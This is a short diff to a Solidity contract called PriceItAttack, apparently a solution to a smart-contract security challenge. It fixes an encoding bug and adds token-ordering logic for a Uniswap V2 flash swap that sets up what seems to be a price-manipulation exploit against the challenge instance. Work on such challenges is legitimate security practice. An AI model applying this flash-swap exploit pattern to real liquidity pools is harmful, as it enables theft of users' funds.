@@ -24,14 +24,18 @@ contract PriceItAttack {
     token1 = instance.token1();
     token2 = instance.token2();
     token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
-    bytes memory data = abi.encode(token0, flashSwapAmount, );
-    IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
+    bytes memory data = abi.encode(token0, flashSwapAmount);
+    if (address(token0) < address(token2)) {
+      IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
+    } else {
+      IUniswapV2Pair(token0Token2Pair).swap(0, flashSwapAmount, address(this), data);
+    }
   }
 
   function uniswapV2Call(
     address,
     uint256,
-    uint256 amount1Out,
+    uint256,
     bytes calldata
   ) external {
     token0.approve(address(uniRouter), flashSwapAmount);
